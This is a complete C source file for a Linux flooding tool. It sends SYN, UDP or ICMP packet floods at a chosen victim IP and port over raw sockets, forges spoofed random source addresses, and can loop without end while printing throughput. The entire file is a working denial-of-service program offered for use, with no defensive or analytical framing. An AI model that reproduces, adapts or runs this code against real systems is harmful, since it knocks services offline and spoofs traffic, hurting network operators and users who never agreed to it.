/*
    Flood DOS with LINUX sockets
*/
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <assert.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

//modifier boucle for main et ajouter while(1) pour chaque cas

unsigned int g_seed;
inline void fastsrand(int seed){
	g_seed = seed;
}
inline int fastrand(int active){ // Linear Congruential Generator
	if(active){
		g_seed = (214013*g_seed+2531011);
		return (g_seed>>16)&0x7FFF;
	}
	return rand();
}

unsigned short rand16b(int mode){
	if(mode){
		return fastrand(1) & 0xFFFF;
	}
    return rand() & 0xFFFF;
}

int isIpAddr(char *ipAddress){
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
    return result != 0;
}

void randIP(char *ipAddress, int frand){
    unsigned char type = rand() % 3, b1, b2, b3;
    switch(type){
        case 0: //10.0.0.0/8
            b1 = fastrand(frand) & 0xFF; // % 256
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "10.%d.%d.%d", b1, b2, b3);
        break;
        
        case 1: //172.16.0.0/12
            b1 = (fastrand(frand) & 0xF) + 16; // % 16
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "172.%d.%d.%d", b1, b2, b3);
        break;
        
        case 2: //192.168.0.0/16
            b1 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "192.168.%d.%d", b1, b3);
        break;
    }
}
 
unsigned short csum(unsigned short *ptr,int nbytes) { // 16 bits Ones' complement addition of Ones' complement 16 bits words of the header and data
    register long sum;
    unsigned short oddbyte;
    register short checksum;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) { //if the message has an odd number of bytes, a 0 is added at its end to make it even
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    checksum=(short)~sum;
     
    return(checksum);
}

double tv_start=0;
uint64_t total_count=0;
uint64_t packet_count=0;
float tRate=0,pRate=0;

void transferRate (int sig){
    struct timeval tv;
    gettimeofday(&tv,NULL);
    double now=(double)(tv.tv_sec*1e6 + tv.tv_usec)/1e6;
    tRate=(8*(float)total_count/(float)(now-tv_start))*1e-3;
    pRate=(float)packet_count/(float)(now-tv_start);
    printf("\nElapsed time %.0lf sec\n",now-tv_start);
    printf("%ld Packets send at %.0f mbps/%.0f pps\n",packet_count,tRate,pRate);
     if(sig == SIGINT){
         printf("----------- DoS End -----------\n");
         exit(1);
     }
}

/*******************************
            SYN FLOOD
********************************/

struct pseudo_header    //used for checksum
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};

void synFlood(char *source, char *dest, int nb, int destPort, int debug, int frand){
    
    //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32];
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
     
    //strcpy(source_ip , "192.168.1.2"); 
    if(strcmp(source, "") == 0){ //preferably an address that doesn't exist 
        randIP(source_ip, frand); //in order to avoid a REST send back
    }                      //, ideally randomized
    else{
        strcpy(source_ip , source);
    }
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destPort); // ex 80
    //sin.sin_addr.s_addr = inet_addr ("1.2.3.4"); 
    sin.sin_addr.s_addr = inet_addr (dest); // victim destination address
    
    memset (datagram, 0, 4096); /* zero out the buffer */
    int packet_size = sizeof (struct ip) + sizeof (struct tcphdr);
    //IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = packet_size;
    iph->id = htons(rand16b(frand));  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     
    //TCP Header
    int sPort = rand16b(frand);
    tcph->source = htons (sPort); // ideally randomize
    tcph->dest = htons (destPort); // ex 80 
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      /* tcp segment */
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* maximum allowed window size */
    tcph->check = 0;/* set to zero, should be autofilled later */
    tcph->urg_ptr = 0;
    
    //IP checksum
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
     
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
     
    //IP_HDRINCL to tell the kernel that headers are included
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    
    //Send packet
    if (sendto (s,      /* socket */
                datagram,   /* headers and data */
                iph->tot_len,    /* total length datagram */
                0,      /* routing flags, normally always 0 */
                (struct sockaddr *) &sin,   /* socket addr */
                sizeof (sin)) < 0){
        printf ("error\n");
    }
    else{
        if(debug){
            printf ("Packet %d Send with %s:%d on %s:%d\n", nb, source_ip, sPort, dest, destPort);
        }
        packet_count++;
        total_count=total_count+packet_size;
    }
    close(s);    
}

/*******************************
            UDP FLOOD
********************************/

struct senderdata {
  int datagram_count;
  int queue_len;
  int secs;
  int us;
  int padding;
};

struct pseudo_header_udp{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

void udpFlood(char *sourceInterface, char *dest, int nb, int destPort, int debug, int frand){

    int sPort = rand16b(frand);
    if(strcmp(sourceInterface, "eth0") == 0){
        //create socket 
        int sock = socket( AF_INET, SOCK_DGRAM, 0 );
        if ( sock < 0 ) {
            perror( "socket" );
            exit( 1 );
        }

        // bond socket to port 
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons( sPort );
        addr.sin_addr.s_addr = INADDR_ANY;

        if ( bind( sock, (struct sockaddr *)&addr, sizeof( addr ) ) < 0 ) {
            perror( "bind" );
            exit( 1 );
        }
        // bind to device
        if ( setsockopt( sock, SOL_SOCKET, SO_BINDTODEVICE, sourceInterface, 4 ) < 0 ) { // ex eth0
            fprintf( stderr, "Error binding to %s\n", sourceInterface );
            perror( "setsockopt SO_BINDTODEVICE" );
            exit( 1 );
        }
        
        // address to flood to
        addr.sin_family=AF_INET;
        addr.sin_port=htons(destPort); // ex 80,123,161
        if ( !inet_aton(dest, &addr.sin_addr ) ) { // ex "220.181.111.147"
            exit( 1 );
        }

        struct senderdata data;
        data.datagram_count = 10;
        data.queue_len = 10;
        data.secs = 5;
        data.us = 10;
        
        // send datagram to target
        if ( (sendto( sock, &data, sizeof( data ),0, (struct sockaddr *)&addr, sizeof(struct sockaddr_in) )) < 0 ) {
            perror( "sendto" );
            //exit( 1 );
        }
        else{
            packet_count++;
            total_count=total_count+62; //packet_size
            if(debug){
                printf("Packet %d send with %s:%d on %s:%d\n",nb, sourceInterface, sPort, dest, destPort);
            }
        }
    }
    else{
        //Create raw socket of type IPPROTO
        int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
        
        if(s == -1){
            //socket creation failed
            perror("Failed to create raw socket");
            exit(1);
        }
        
        //Datagram to represent the packet
        char datagram[4096] , source_ip[32] , *data;
        
        //zero out the packet buffer
        memset (datagram, 0, 4096);
        
        //IP header
        struct iphdr *iph = (struct iphdr *) datagram;
        
        //UDP header
        struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
        
        struct sockaddr_in sin;
        struct pseudo_header_udp psh;
        
        //Data part
        data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
        strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
        
        //Source ip
        //strcpy(source_ip , "192.168.1.2");
        if(strcmp(sourceInterface, "") == 0){
            randIP(source_ip, frand);
        }
        else{
            strcpy(source_ip , sourceInterface);
        }
        //Target ip
        sin.sin_family = AF_INET;
        sin.sin_port = htons(destPort); //ex 80
        sin.sin_addr.s_addr = inet_addr (dest);
        
        int packet_size = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
        //IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = packet_size;
        iph->id = htonl (rand16b(frand)); //Id of this packet
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;      //Set to 0 before calculating checksum
        iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
        iph->daddr = sin.sin_addr.s_addr;
        
        //Ip checksum
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        
        //UDP header
        int sPort = rand16b(frand);
        udph->source = htons (sPort);
        udph->dest = htons (destPort);
        udph->len = htons(8 + strlen(data)); //tcp header size
        udph->check = 0; //leave checksum 0 now, filled later by pseudo header
        
        //UDP checksum using the pseudo header
        psh.source_address = inet_addr( source_ip );
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );
        
        int psize = sizeof(struct pseudo_header_udp) + sizeof(struct udphdr) + strlen(data);
        char pseudogram[psize];
        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header_udp));
        memcpy(pseudogram + sizeof(struct pseudo_header_udp) , udph , sizeof(struct udphdr) + strlen(data));
        
        udph->check = csum( (unsigned short*) pseudogram , psize);
        
        
        // send datagram to target
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0) {
            perror( "sendto" );
            //exit( 1 );
        }
        else{ 
            if(debug){
                printf("Packet %d send with %s:%d on %s:%d\n",nb, source_ip, sPort, dest, destPort);
            }
            packet_count++;
            total_count=total_count+packet_size;
        }
        close(s);
    }
}

/*******************************
            ICMP FLOOD
********************************/

void icmpFlood(char *source, char *dest, int nb, int debug, int frand){
    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 32, sent_size;
    char source_ip[32];
    
    if(strcmp(source, "") == 0){ //preferably an address that doesn't exist 
        randIP(source_ip, frand); //in order to avoid a REST send back
    }                      //, ideally randomized
    else{
        strcpy(source_ip , source);
    }
    saddr = inet_addr(source_ip);
    daddr = inet_addr(dest);
    
    //Raw socket - if IPPROTO_ICMP, then ICMP header checksum is added, if IPPROTO_RAW, then it wont
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0){
        perror("could not create socket");
        exit(0);
    }
     
    int on = 1;
    
    //provide IP headers
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1){
        perror("setsockopt");
        exit (0);
    }
    
    //allow socket to send datagrams to broadcast addresses
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1){
        perror("setsockopt");
        exit (0);
    }

    //total packet size
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);

    if (!packet){
        perror("out of memory");
        close(sockfd);
        exit (0);
    }
    
    //ip header
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
    
    //zero out packet buffer
    memset (packet, 0, packet_size);
    //printf("%d\n",packet_size);
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand16b(frand);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->check = 0;
    ip->saddr = saddr;
    ip->daddr = daddr;
    
    //ip checksum
    ip->check = csum ((unsigned short *) ip, sizeof(struct iphdr));
    
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand16b(frand);
    icmp->un.echo.id = rand16b(frand);
    //checksum
    icmp->checksum = csum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
     
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
    
    memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), 0, payload_size);
    
    if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1){
        perror("send failed\n");
        //exit(1);
    }
    else{
        if(debug){
            printf("Packet %d send with %s on %s\n",nb, source_ip, dest);
        }
        packet_count++;
        total_count=total_count+packet_size;
    }
     
    free(packet);
    close(sockfd);
}
 
int main (int argc, char *argv[]){
    srand(time(NULL));
	fastsrand(time(NULL));
    /********************
        Command Check
    *********************/
    int debug = 0;
    char usage[] = "flood <mode:syn|udp|icmp|help> <source: ip|interface name|random|fastrandom> <dest: ip> <number to send|loop> <dest Port|icmp payload:32> <debug mode: debug>";
    if(argc == 1 || (argc < 5 && argc > 7)){
        printf ("Error Usage : %s\n",usage);
        exit(0);
    }
    if(strcmp(argv[1],"help") == 0 || (strcmp(argv[1],"syn") != 0 && strcmp(argv[1],"udp") != 0 && (strcmp(argv[1],"icmp") != 0)) ){
        printf ("Usage : %s\n",usage);
        exit(0);
    }
    
    char *ethType = strstr(argv[2], "eth"), *enType = strstr(argv[2], "en"), *emType = strstr(argv[2], "em"), *wlanType = strstr(argv[2], "wlan"); 
	if(!isIpAddr(argv[2]) && (ethType == NULL && enType == NULL && emType == NULL && wlanType == NULL) && strcmp(argv[2],"random") != 0 && strcmp(argv[2],"fastrandom") != 0){
        printf ("Error Usage arg 2 : %s\n",usage);
        exit(0);
    }
    if(!isIpAddr(argv[3])){
        printf ("Error Usage arg 3 : %s\n",usage);
        exit(0);
    }
    if(atoi(argv[4]) <= 0 && strcmp(argv[4],"loop") != 0){
		printf ("Error Usage arg 4 : %s\n",usage);
		exit(0);
	}
    if(strcmp(argv[1],"syn") == 0 || strcmp(argv[1],"udp") == 0){
		if(atoi(argv[5]) <= 0 || atoi(argv[5]) > 65535){
		    printf ("Error Usage arg 5 : %s\n",usage);
		    exit(0);
		}
    }
    if(strcmp(argv[argc-1],"debug") == 0 ){
        debug = 1;
    }
    
    signal(SIGINT, transferRate);
    struct timeval tv;
    total_count=0;
    packet_count=0;
    gettimeofday(&tv,NULL);
    tv_start=(double)(tv.tv_sec*1e6 + tv.tv_usec)/1e6;
    
    /********************
		   SYN Start
    *********************/
    
    int i=0, max=atoi(argv[4]), loop=0;
    if(strcmp(argv[4],"loop") == 0){
    	loop=1;
    }
    if(strcmp(argv[1],"syn") == 0){
        printf("---------- SYN DoS Start ----------\n");
        if(!loop){
		    if(strcmp(argv[2],"random") == 0){
		        for(i=0;i<max;i++){
		            synFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
		        }
		    }
		    else if(strcmp(argv[2],"fastrandom") == 0){
		        for(i=0;i<max;i++){
		            synFlood("",argv[3],i+1,atoi(argv[5]),debug, 1);
		        }
		    }
		    else{
		        for(i=0;i<max;i++){                
					synFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
		        }
		    }
	    }
	    else{
	    	if(strcmp(argv[2],"random") == 0){
		        while(1){
		            synFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
		        }
		    }
		    else if(strcmp(argv[2],"fastrandom") == 0){
		        while(1){
		            synFlood("",argv[3],i+1,atoi(argv[5]),debug, 1);
		        }
		    }
		    else{
		        while(1){
		     		synFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
		        }
		    }
	    }
        transferRate(0);
        printf("----------- SYN DoS End -----------\n");
    }
    /********************
		  UDP Start
    *********************/
    else if(strcmp(argv[1],"udp") == 0){
        printf("---------- UDP DoS Start ----------\n");
        if(!loop){
		    if(strcmp(argv[2],"random") == 0){
		        for(i=0;i<max || loop == 1;i++){
		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
		        }        
		    }
		    else if(strcmp(argv[2],"fastrandom") == 0){
		        for(i=0;i<max;i++){
		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,1);
		        }
		    }
		    else{
		        for(i=0;i<max;i++){
					udpFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
		        }            
		    }
	    }
	    else{
	    	if(strcmp(argv[2],"random") == 0){
		        while(1){
		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,0);
		        }        
		    }
		    else if(strcmp(argv[2],"fastrandom") == 0){
		        while(1){
		            udpFlood("",argv[3],i+1,atoi(argv[5]),debug,1);
		        }
		    }
		    else{
		        while(1){
               		udpFlood(argv[2],argv[3],i+1,atoi(argv[5]),debug,0);
		        }            
		    }
	    }
        transferRate(0);
        printf("----------- UDP DoS End -----------\n");
    }
    /********************
		  ICMP Start
    *********************/
    else if(strcmp(argv[1],"icmp") == 0){
        printf("---------- ICMP DoS Start----------\n");
        if(!loop){
		    if(strcmp(argv[2],"random") == 0){
		        for(i=0;i<max;i++){
		            icmpFlood("",argv[3],i+1,debug,0);
		        }        
		    }
		    else if(strcmp(argv[2],"fastrandom") == 0){
		        for(i=0;i<max;i++){
		            icmpFlood("",argv[3],i+1,debug,1);
		        }
		    }
		    else{
		        for(i=0;i<max;i++){
		            icmpFlood(argv[2],argv[3],i+1,debug,0);
		        }            
		    }
	    }
	    else{
	    	if(strcmp(argv[2],"random") == 0){
		        while(1){
		            icmpFlood("",argv[3],i+1,debug,0);
		        }        
		    }
		    else if(strcmp(argv[2],"fastrandom") == 0){
		        while(1){
		            icmpFlood("",argv[3],i+1,debug,1);
		        }
		    }
		    else{
		        while(1){
		            icmpFlood(argv[2],argv[3],i+1,debug,0);
		        }            
		    }
	    }
        transferRate(0);
        printf("---------- ICMP DoS End  ----------\n");
    }
    return 0;
}
